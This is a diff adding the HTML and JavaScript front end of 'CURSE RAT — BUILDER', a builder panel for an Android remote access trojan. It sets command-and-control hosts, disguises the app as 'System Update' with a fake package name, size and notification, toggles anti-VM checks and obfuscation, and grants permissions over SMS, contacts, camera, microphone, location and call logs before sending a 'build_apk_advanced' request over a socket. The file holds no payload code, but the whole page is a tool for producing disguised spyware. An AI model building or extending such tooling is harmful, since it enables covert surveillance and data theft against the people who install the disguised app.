@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>CURSE RAT — BUILDER</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --red: #cc0000; --red-bright: #ff1a1a; --red-dim: #7a0000; --red-glow: rgba(204,0,0,0.35);
+  --bg: #050505; --bg2: #0a0a0a; --panel: rgba(8,0,0,0.88); --border: rgba(200,30,30,0.35);
+  --border-light: rgba(200,30,30,0.12); --text: #e8e8e8; --text-dim: #777; --text-muted: #555;
+  --green-ok: #00ff88; --font-mono: 'Share Tech Mono', monospace;
+  --font-display: 'Orbitron', sans-serif; --font-body: 'Rajdhani', sans-serif;
+  --nav2-width: 150px; --radius: 10px; --radius-sm: 6px;
+  --transition: 0.25s cubic-bezier(0.4,0,0.2,1);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{width:100%;height:100%;background:var(--bg);color:var(--text);font-family:var(--font-body);overflow:hidden;user-select:none;-webkit-tap-highlight-color:transparent;}
+::-webkit-scrollbar{width:4px;}::-webkit-scrollbar-track{background:#000;}::-webkit-scrollbar-thumb{background:var(--red-dim);border-radius:2px;}
+.scanlines{position:fixed;inset:0;z-index:1;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.07) 2px,rgba(0,0,0,0.07) 4px);}
+a{color:var(--red-bright);text-decoration:none;}
+
+/* ── LAYOUT ── */
+#page{position:relative;z-index:10;width:100%;height:100%;display:flex;flex-direction:column;}
+
+/* ── TOPBAR ── */
+#topbar{display:flex;align-items:center;justify-content:space-between;padding:8px 14px;background:rgba(5,0,0,0.95);border-bottom:1px solid var(--border);flex-shrink:0;min-height:46px;backdrop-filter:blur(10px);}
+#topbar-title{font-family:var(--font-display);font-size:14px;letter-spacing:3px;color:var(--red-bright);text-shadow:0 0 12px var(--red-glow);}
+#topbar-sub{font-family:var(--font-mono);font-size:9px;color:var(--text-muted);letter-spacing:1px;}
+#clock{font-family:var(--font-mono);font-size:10px;color:var(--text-dim);letter-spacing:1px;}
+
+/* ── NAV2 (sub-navigation) ── */
+#nav2{width:var(--nav2-width);background:rgba(3,0,0,0.95);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0;overflow-y:auto;padding:4px 0;}
+.nav2-btn{display:flex;align-items:center;gap:8px;padding:8px 12px;margin:2px 6px;background:none;border:none;color:var(--text-dim);font-family:var(--font-body);font-size:12px;font-weight:600;cursor:pointer;border-radius:var(--radius-sm);transition:var(--transition);letter-spacing:1px;text-align:left;}
+.nav2-btn:hover{background:rgba(200,0,0,0.08);color:var(--text);}
+.nav2-btn.active{background:rgba(200,0,0,0.15);color:var(--red-bright);border-left:2px solid var(--red-bright);}
+.nav2-icon{font-size:14px;width:20px;text-align:center;}
+
+/* ── CONTENT ── */
+#body-wrap{display:flex;flex:1;overflow:hidden;}
+#content-body{flex:1;overflow-y:auto;padding:12px;background:radial-gradient(ellipse at 50% 0%,rgba(80,0,0,0.05),transparent 70%);}
+
+/* ── SECTION PANELS ── */
+.section-panel{display:none;}
+.section-panel.active{display:block;animation:fadeIn 0.25s ease;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px);}to{opacity:1;transform:translateY(0);}}
+
+/* ── CARDS ── */
+.card{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);margin-bottom:12px;overflow:hidden;backdrop-filter:blur(6px);}
+.card-header{display:flex;align-items:center;gap:8px;padding:9px 14px;font-family:var(--font-display);font-size:10px;letter-spacing:2px;color:var(--text-dim);border-bottom:1px solid var(--border-light);text-transform:uppercase;}
+.card-body{padding:12px 14px;}
+.card-row{display:flex;gap:12px;margin-bottom:8px;flex-wrap:wrap;}
+.card-row:last-child{margin-bottom:0;}
+
+/* ── FORM ELEMENTS ── */
+.fl{display:flex;flex-direction:column;gap:4px;flex:1;min-width:140px;}
+.fl-label{font-family:var(--font-mono);font-size:9px;color:var(--text-muted);letter-spacing:1px;}
+.fl input,.fl select{background:#000;border:1px solid var(--border-light);color:var(--text);padding:8px 10px;border-radius:var(--radius-sm);font-family:var(--font-mono);font-size:12px;outline:none;transition:var(--transition);}
+.fl input:focus,.fl select:focus{border-color:var(--red-dim);box-shadow:0 0 8px var(--red-glow);}
+
+/* ── TOGGLE ── */
+.toggle{width:40px;height:22px;border-radius:11px;background:#222;border:1px solid var(--border-light);cursor:pointer;position:relative;transition:var(--transition);flex-shrink:0;}
+.toggle::after{content:'';position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;background:var(--text-muted);transition:var(--transition);}
+.toggle.checked{background:var(--red-dim);border-color:var(--red-bright);}
+.toggle.checked::after{left:20px;background:var(--red-bright);box-shadow:0 0 6px var(--red-glow);}
+
+/* ── BUTTONS ── */
+.btn{background:rgba(200,0,0,0.1);border:1px solid var(--border);color:var(--text);padding:7px 16px;border-radius:var(--radius-sm);font-family:var(--font-display);font-size:9px;letter-spacing:2px;cursor:pointer;transition:var(--transition);}
+.btn:hover{background:var(--red-dim);border-color:var(--red-bright);}
+.btn-primary{background:var(--red-dim);border-color:var(--red-bright);color:#fff;}
+.btn-primary:hover{background:var(--red-bright);box-shadow:0 0 15px var(--red-glow);}
+.btn-sm{padding:5px 10px;font-size:8px;}
+.btn-group{display:flex;gap:6px;flex-wrap:wrap;}
+
+/* ── DNS ENTRIES ── */
+#dns-entries{display:flex;flex-wrap:wrap;gap:6px;padding:6px 0;}
+.dns-entry{display:flex;align-items:center;gap:6px;background:rgba(200,0,0,0.08);border:1px solid var(--border-light);border-radius:var(--radius-sm);padding:5px 10px;font-family:var(--font-mono);font-size:10px;color:var(--text-dim);}
+.dns-dot{width:5px;height:5px;border-radius:50%;background:var(--red-dim);}
+
+/* ── PERMISSIONS ── */
+#perm-list{display:flex;flex-wrap:wrap;gap:6px;padding:6px 0;max-height:160px;overflow-y:auto;}
+.perm-entry{display:flex;align-items:center;gap:6px;background:rgba(0,0,0,0.5);border:1px solid var(--border-light);border-radius:var(--radius-sm);padding:4px 10px;font-family:var(--font-mono);font-size:9px;color:var(--text-dim);cursor:pointer;transition:var(--transition);}
+.perm-entry.selected{border-color:var(--red-dim);color:var(--red-bright);background:rgba(200,0,0,0.1);}
+.perm-dot{width:4px;height:4px;border-radius:50%;background:var(--red-dim);}
+
+/* ── ICON UPLOAD ── */
+.icon-upload-area{width:80px;height:80px;background:rgba(0,0,0,0.6);border:2px dashed var(--border);border-radius:var(--radius-sm);display:flex;align-items:center;justify-content:center;cursor:pointer;overflow:hidden;transition:var(--transition);}
+.icon-upload-area:hover{border-color:var(--red-dim);}
+.icon-upload-area img{width:100%;height:100%;object-fit:contain;}
+
+/* ── BUILD LOG ── */
+#build-log{background:rgba(0,0,0,0.7);border:1px solid var(--border-light);border-radius:var(--radius-sm);padding:12px;height:250px;overflow-y:auto;font-family:var(--font-mono);font-size:10px;color:var(--text-dim);line-height:1.6;}
+#build-log div{margin-bottom:4px;}
+
+/* ── RESPONSIVE ── */
+@media(max-width:768px){
+  #nav2{width:100%;flex-direction:row;overflow-x:auto;border-right:none;border-bottom:1px solid var(--border);padding:4px;}
+  .nav2-btn{flex-shrink:0;font-size:11px;padding:6px 10px;}
+  #body-wrap{flex-direction:column;}
+  #content-body{padding:8px;}
+  .card-row{flex-direction:column;}
+  .fl{min-width:100%;}
+  #topbar-title{font-size:12px;}
+  #clock{font-size:8px;}
+  #build-log{height:180px;}
+}
+</style>
+</head>
+<body>
+<div class="scanlines"></div>
+<div id="page">
+
+<div id="topbar">
+  <div><span id="topbar-title">CONNECTION</span> <span id="topbar-sub" style="font-family:var(--font-mono);font-size:9px;color:var(--text-muted);margin-left:6px;">// HOST_CONFIG</span></div>
+  <span id="clock">--</span>
+</div>
+
+<div id="body-wrap">
+  <!-- SUB NAV -->
+  <div id="nav2">
+    <button class="nav2-btn active" data-section="connection" onclick="switchSection('connection')"><span class="nav2-icon">🔗</span>CONNECTION</button>
+    <button class="nav2-btn" data-section="appearance" onclick="switchSection('appearance')"><span class="nav2-icon">🎨</span>APPEARANCE</button>
+    <button class="nav2-btn" data-section="permissions" onclick="switchSection('permissions')"><span class="nav2-icon">🔐</span>PERMISSIONS</button>
+    <button class="nav2-btn" data-section="notifications" onclick="switchSection('notifications')"><span class="nav2-icon">🔔</span>NOTIFICATIONS</button>
+    <button class="nav2-btn" data-section="tools" onclick="switchSection('tools')"><span class="nav2-icon">🛠</span>TOOLS</button>
+    <button class="nav2-btn" data-section="build" onclick="switchSection('build')"><span class="nav2-icon">⚡</span>BUILD</button>
+  </div>
+
+  <div id="content-body">
+
+    <!-- CONNECTION Panel -->
+    <div class="section-panel active" id="section-connection">
+      <div class="card">
+        <div class="card-header"><span style="width:6px;height:6px;border-radius:50%;background:var(--red-dim);flex-shrink:0;"></span>C2 HOSTS</div>
+        <div class="card-body">
+          <div class="card-row">
+            <div class="fl"><span class="fl-label">HOST</span><input type="text" id="input-host" placeholder="IP or domain"></div>
+            <div class="fl" style="flex:0.4;min-width:80px;"><span class="fl-label">PORT</span>
+              <div style="display:flex;gap:4px;">
+                <input type="number" id="input-port" value="7771" min="1" max="65535" style="flex:1;">
+                <button class="btn btn-sm" onclick="stepPort(-1)">−</button>
+                <button class="btn btn-sm" onclick="stepPort(1)">+</button>
+              </div>
+            </div>
+          </div>
+          <div class="btn-group" style="margin-bottom:10px;">
+            <button class="btn" onclick="addDnsEntry()">+ ADD</button>
+            <button class="btn" onclick="removeDnsEntry()">− REMOVE</button>
+          </div>
+          <div id="dns-entries"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- APPEARANCE Panel -->
+    <div class="section-panel" id="section-appearance">
+      <div class="card">
+        <div class="card-header"><span style="width:6px;height:6px;border-radius:50%;background:var(--red-dim);flex-shrink:0;"></span>APP IDENTITY</div>
+        <div class="card-body">
+          <div class="card-row">
+            <div class="fl"><span class="fl-label">APP NAME</span><input type="text" id="input-appname" value="System Update"></div>
+            <div class="fl"><span class="fl-label">APP VERSION</span>
+              <div style="display:flex;gap:4px;">
+                <input type="text" id="input-appversion" value="1.0" style="flex:1;">
+                <button class="btn btn-sm" onclick="randomizeVersion()">🎲</button>
+              </div>
+            </div>
+          </div>
+          <div class="card-row">
+            <div class="fl"><span class="fl-label">PACKAGE NAME</span>
+              <div style="display:flex;gap:4px;">
+                <input type="text" id="input-packagename" value="com.system.update" style="flex:1;">
+                <button class="btn btn-sm" onclick="randomizePackage()">🎲</button>
+              </div>
+            </div>
+          </div>
+          <div class="card-row">
+            <div class="fl"><span class="fl-label">ICON (PNG)</span>
+              <div style="display:flex;align-items:center;gap:12px;">
+                <label class="icon-upload-area" id="icon-preview" style="cursor:pointer;">
+                  <input type="file" accept="image/png" style="display:none;" onchange="previewIcon(this,'icon-preview')">
+                  <span style="font-size:10px;color:var(--text-muted);">+</span>
+                </label>
+                <span style="font-size:9px;color:var(--text-muted);">64x64 px</span>
+              </div>
+            </div>
+            <div class="fl"><span class="fl-label">FAKE SIZE</span>
+              <div style="display:flex;align-items:center;gap:8px;">
+                <div class="toggle" id="toggle-fake-size" onclick="thorToggle(this)"></div>
+                <input type="number" id="input-fake-size" value="15" min="1" max="999" style="width:60px;background:#000;border:1px solid var(--border-light);color:var(--text);padding:6px;border-radius:var(--radius-sm);font-family:var(--font-mono);font-size:11px;">
+                <span style="font-size:9px;color:var(--text-muted);">MB</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PERMISSIONS Panel -->
+    <div class="section-panel" id="section-permissions">
+      <div class="card">
+        <div class="card-header"><span style="width:6px;height:6px;border-radius:50%;background:var(--red-dim);flex-shrink:0;"></span>ACCESS CONTROL</div>
+        <div class="card-body">
+          <div class="card-row">
+            <div class="fl" style="flex-direction:row;align-items:center;gap:10px;">
+              <span class="fl-label" style="margin:0;">ALL PERMISSIONS</span>
+              <div class="toggle" id="toggle-allperms" onclick="thorToggle(this);toggleAllPerms();"></div>
+            </div>
+          </div>
+          <div class="card-row">
+            <div class="fl"><span class="fl-label">ADD PERMISSION</span>
+              <div style="display:flex;gap:6px;">
+                <select id="perms-dropdown" style="flex:1;background:#000;border:1px solid var(--border-light);color:var(--text);padding:6px 10px;border-radius:var(--radius-sm);font-family:var(--font-mono);font-size:10px;">
+                  <option value="">-- SELECT --</option>
+                  <option value="android.permission.INTERNET">INTERNET</option>
+                  <option value="android.permission.READ_CONTACTS">READ_CONTACTS</option>
+                  <option value="android.permission.WRITE_CONTACTS">WRITE_CONTACTS</option>
+                  <option value="android.permission.READ_SMS">READ_SMS</option>
+                  <option value="android.permission.SEND_SMS">SEND_SMS</option>
+                  <option value="android.permission.CAMERA">CAMERA</option>
+                  <option value="android.permission.RECORD_AUDIO">RECORD_AUDIO</option>
+                  <option value="android.permission.ACCESS_FINE_LOCATION">ACCESS_FINE_LOCATION</option>
+                  <option value="android.permission.ACCESS_COARSE_LOCATION">ACCESS_COARSE_LOCATION</option>
+                  <option value="android.permission.READ_CALL_LOG">READ_CALL_LOG</option>
+                  <option value="android.permission.READ_EXTERNAL_STORAGE">READ_EXTERNAL_STORAGE</option>
+                  <option value="android.permission.WRITE_EXTERNAL_STORAGE">WRITE_EXTERNAL_STORAGE</option>
+                  <option value="android.permission.SYSTEM_ALERT_WINDOW">SYSTEM_ALERT_WINDOW</option>
+                  <option value="android.permission.FOREGROUND_SERVICE">FOREGROUND_SERVICE</option>
+                  <option value="android.permission.RECEIVE_BOOT_COMPLETED">RECEIVE_BOOT_COMPLETED</option>
+                </select>
+                <button class="btn btn-sm" onclick="addPermission()">+</button>
+                <button class="btn btn-sm" onclick="removePermission()">−</button>
+              </div>
+            </div>
+          </div>
+          <div id="perm-list"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- NOTIFICATIONS Panel -->
+    <div class="section-panel" id="section-notifications">
+      <div class="card">
+        <div class="card-header"><span style="width:6px;height:6px;border-radius:50%;background:var(--red-dim);flex-shrink:0;"></span>NOTIFICATION CONFIG</div>
+        <div class="card-body">
+          <div class="card-row">
+            <div class="fl" style="flex-direction:row;align-items:center;gap:10px;">
+              <span class="fl-label" style="margin:0;">PERSISTENT NOTIFICATION</span>
+              <div class="toggle checked" id="toggle-notif" onclick="thorToggle(this)"></div>
+            </div>
+          </div>
+          <div class="card-row">
+            <div class="fl"><span class="fl-label">NOTIFICATION TEXT</span>
+              <input type="text" id="input-notif-text" value="System Update Running...">
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TOOLS Panel -->
+    <div class="section-panel" id="section-tools">
+      <div class="card">
+        <div class="card-header"><span style="width:6px;height:6px;border-radius:50%;background:var(--red-dim);flex-shrink:0;"></span>MODULES</div>
+        <div class="card-body">
+          <div class="card-row">
+            <div class="fl" style="flex-direction:row;align-items:center;gap:10px;">
+              <span class="fl-label" style="margin:0;">ADVANCED OBFUSCATION</span>
+              <div class="toggle" onclick="thorToggle(this)"></div>
+            </div>
+          </div>
+          <div class="card-row">
+            <div class="fl" style="flex-direction:row;align-items:center;gap:10px;">
+              <span class="fl-label" style="margin:0;">ANTI-VM CHECK</span>
+              <div class="toggle checked" onclick="thorToggle(this)"></div>
+            </div>
+          </div>
+          <div class="card-row">
+            <div style="font-size:10px;color:var(--text-muted);padding:6px 0;font-family:var(--font-mono);">⏳ More modules in development...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- BUILD Panel -->
+    <div class="section-panel" id="section-build">
+      <div class="card">
+        <div class="card-header"><span style="width:6px;height:6px;border-radius:50%;background:var(--red-dim);flex-shrink:0;"></span>GENERATE PAYLOAD</div>
+        <div class="card-body">
+          <button class="btn btn-primary" id="start-build-btn" style="width:100%;padding:12px;font-size:11px;margin-bottom:12px;">⚡ INITIALIZE BUILD</button>
+          <div style="font-family:var(--font-mono);font-size:8px;color:var(--text-muted);margin-bottom:6px;letter-spacing:2px;">// BUILD LOG</div>
+          <div id="build-log">// READY</div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /content-body -->
+</div><!-- /body-wrap -->
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io();
+
+// ── CLOCK ──
+(function(){const c=document.getElementById('clock');function t(){const d=new Date();c.textContent=d.toISOString().replace('T',' ').slice(0,19)+' UTC';}t();setInterval(t,1000);})();
+
+// ── SECTION META ──
+const sectionMeta = {
+  'connection':   { title: 'CONNECTION',   sub: 'HOST_CONFIG' },
+  'appearance':   { title: 'APPEARANCE',   sub: 'APP_IDENTITY' },
+  'notifications':{ title: 'NOTIFICATIONS', sub: 'PERSIST_SERVICE' },
+  'tools':        { title: 'TOOLS',         sub: 'MODULES' },
+  'permissions':  { title: 'PERMISSIONS',   sub: 'ACCESS_CONTROL' },
+  'build':        { title: 'BUILD',         sub: 'GENERATE_PAYLOAD' }
+};
+
+function switchSection(id){
+  document.querySelectorAll('.nav2-btn').forEach(b=>b.classList.toggle('active',b.dataset.section===id));
+  document.querySelectorAll('.section-panel').forEach(p=>p.classList.toggle('active',p.id==='section-'+id));
+  const meta=sectionMeta[id]||{title:id.toUpperCase(),sub:''};
+  document.getElementById('topbar-title').textContent=meta.title;
+  document.getElementById('topbar-sub').textContent=meta.sub;
+  document.getElementById('content-body').scrollTop=0;
+}
+
+// ── DNS ──
+function addDnsEntry(){
+  const host=document.getElementById('input-host').value.trim();
+  const port=document.getElementById('input-port').value.trim();
+  if(!host)return;
+  const list=document.getElementById('dns-entries');
+  const el=document.createElement('div');el.className='dns-entry';el.dataset.value=`${host}:${port}`;
+  el.innerHTML=`<div class="dns-dot"></div>${host}:${port}`;
+  list.appendChild(el);
+  document.getElementById('input-host').value='';
+}
+function removeDnsEntry(){const c=document.getElementById('dns-entries');if(c.lastChild)c.removeChild(c.lastChild);}
+function stepPort(d){const inp=document.getElementById('input-port');inp.value=Math.min(65535,Math.max(1,(parseInt(inp.value)||7771)+d));}
+function thorToggle(el){el.classList.toggle('checked');}
+
+// ── RANDOMIZE ──
+function randomizeVersion(){const v=()=>Math.floor(Math.random()*10);document.getElementById('input-appversion').value=`${v()}.${v()}`;}
+function randomizePackage(){const w=['system','service','manager','update','core','sync','data','secure','base','util'];const w1=w[Math.floor(Math.random()*w.length)],w2=w[Math.floor(Math.random()*w.length)];document.getElementById('input-packagename').value=`com.${w1}.${w2}`;}
+
+// ── ICON ──
+let base64Icon=null;
+function previewIcon(input,boxId){
+  if(!input.files||!input.files[0])return;
+  const reader=new FileReader();
+  reader.onload=e=>{document.getElementById(boxId).innerHTML=`<img src="${e.target.result}" alt="icon">`;base64Icon=e.target.result;};
+  reader.readAsDataURL(input.files[0]);
+}
+
+// ── PERMISSIONS ──
+function toggleAllPerms(){
+  const t=document.getElementById('toggle-allperms');
+  const list=document.getElementById('perm-list');
+  list.innerHTML='';
+  if(t.classList.contains('checked')){
+    const sel=document.getElementById('perms-dropdown');
+    Array.from(sel.options).forEach(opt=>{if(!opt.value)return;addPermEntry(opt.value);});
+  }
+}
+function addPermission(){
+  const sel=document.getElementById('perms-dropdown');
+  if(!sel.value)return;
+  const list=document.getElementById('perm-list');
+  const existing=[...list.querySelectorAll('.perm-entry')].map(e=>e.dataset.perm);
+  if(existing.includes(sel.value))return;
+  addPermEntry(sel.value);
+}
+function addPermEntry(name){
+  const list=document.getElementById('perm-list');
+  const el=document.createElement('div');el.className='perm-entry';el.dataset.perm=name;
+  el.innerHTML=`<div class="perm-dot"></div>${name}`;
+  el.onclick=()=>{list.querySelectorAll('.perm-entry').forEach(e=>e.classList.remove('selected'));el.classList.add('selected');};
+  list.appendChild(el);
+}
+function removePermission(){const sel=document.querySelector('.perm-entry.selected');if(sel)sel.remove();}
+
+// ── BUILD LOG ──
+const buildLog=document.getElementById('build-log');
+function log(msg){
+  const div=document.createElement('div');div.textContent=`> ${msg}`;buildLog.appendChild(div);buildLog.scrollTop=buildLog.scrollHeight;
+}
+
+// ── BUILD ──
+document.getElementById('start-build-btn').onclick=()=>{
+  const dnsList=[...document.querySelectorAll('.dns-entry')].map(e=>e.dataset.value);
+  if(dnsList.length===0){const h=document.getElementById('input-host').value.trim(),p=document.getElementById('input-port').value.trim();if(h&&p)dnsList.push(`${h}:${p}`);}
+  if(dnsList.length===0)return showToast("⚠️ Add at least one connection entry!");
+  buildLog.innerHTML='// STARTING BUILD PROCESS...<br>';
+  const config={
+    hosts:dnsList.join(','),
+    appName:document.getElementById('input-appname').value,
+    appVersion:document.getElementById('input-appversion').value,
+    packageName:document.getElementById('input-packagename').value,
+    notifText:document.getElementById('input-notif-text').value,
+    notifEnabled:document.getElementById('toggle-notif').classList.contains('checked'),
+    fakeSize:document.getElementById('toggle-fake-size').classList.contains('checked')?parseInt(document.getElementById('input-fake-size').value):0,
+    icon:base64Icon,
+    permissions:document.getElementById('toggle-allperms').classList.contains('checked')?'ALL':[...document.querySelectorAll('.perm-entry')].map(e=>e.dataset.perm)
+  };
+  socket.emit('build_apk_advanced',config);
+};
+
+socket.on('build_log',(data)=>{data.split('\n').forEach(l=>{if(l.trim())log(l.trim());});});
+socket.on('build_success',(file)=>{log('SUCCESS: '+file+' generated.');showToast('✅ Build complete: '+file);});
+
+// ── TOAST ──
+function showToast(msg,duration=2000){
+  let t=document.getElementById('thor-toast');
+  if(!t){t=document.createElement('div');t.id='thor-toast';t.style.cssText='position:fixed;bottom:60px;left:50%;transform:translateX(-50%);z-index:999;background:rgba(0,0,0,0.92);border:1px solid var(--border);border-radius:6px;padding:10px 20px;font-family:var(--font-mono);font-size:11px;color:#e8e8e8;backdrop-filter:blur(8px);opacity:0;transition:opacity 0.3s;pointer-events:none;max-width:90%;text-align:center;';document.body.appendChild(t);}
+  t.textContent='';t.appendChild(document.createTextNode(msg));
+  t.style.opacity='1';
+  setTimeout(()=>{t.style.opacity='0';},duration);
+}
+</script>
+</body>
+</html>
